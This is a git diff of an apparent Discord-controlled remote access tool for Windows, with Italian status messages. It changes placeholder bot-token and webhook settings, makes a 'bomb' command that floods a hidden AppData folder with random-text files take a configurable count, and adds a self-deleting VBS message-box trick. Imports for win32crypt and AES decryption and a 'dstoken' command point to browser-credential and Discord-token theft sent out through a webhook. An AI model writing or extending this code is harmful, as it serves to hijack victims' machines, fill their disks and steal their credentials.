@@ -1,6 +1,5 @@
-botoken = 'ENTER YOUR BOT TOKEN HERE'
-weburl = 'ENTER YOUR WEBHOOK URL HERE'
-
+weburl = 'ENTER HERE YOUR WEBHOOK URL'
+botoken = 'ENTER HERE YOUR BOT TOKEN'
 import discord
 from discord.ext import commands
 from discord_webhook import DiscordWebhook
@@ -21,6 +20,7 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
+
 
 username = os.environ["USERNAME"]
 userprofile = os.environ["USERPROFILE"]
@@ -298,10 +298,10 @@ async def shutdown(ctx,arg):
 
 
 @client.command()
-async def bomb(ctx):
+async def bomb(ctx,arg):
     subprocess.getoutput('if not exist "%localappdata%\WinStart" md "%localappdata%\WinStart"')
     await ctx.send("Atomica lanciata")
-    for i in range(0,10000000):
+    for i in range(0,int(arg)):
         subprocess.getoutput('echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%localappdata%\WinStart\%random%%random%.txt"')
     await ctx.send("L'atomica ha lasciato il segno")
 
@@ -324,15 +324,11 @@ async def desktopbomb(ctx,arg):
 @client.command()
 async def sendmsg(ctx,arg):
     subprocess.getoutput(f'echo msgbox "{arg}", 0, "MESSAGE" > "%appdata%\m.vbs"')
+    subprocess.getoutput('echo createobject("scripting.filesystemobject").DeleteFile "m.vbs" >> "%appdata%\m.vbs"')
     os.chdir(appdatar)
     subprocess.getoutput('start m.vbs')
     await ctx.send(f"Messaggio {arg} inviato")
 
-@client.command()
-async def m(ctx):
-    subprocess.getoutput('del m.vbs/q')
-    await ctx.send("Eseguito")
-    
 @client.command()
 async def purge(ctx,arg):
     await ctx.channel.purge(limit=int(arg)+1)
@@ -532,3 +528,4 @@ async def dstoken(ctx):
 
 
 client.run(botoken)
+
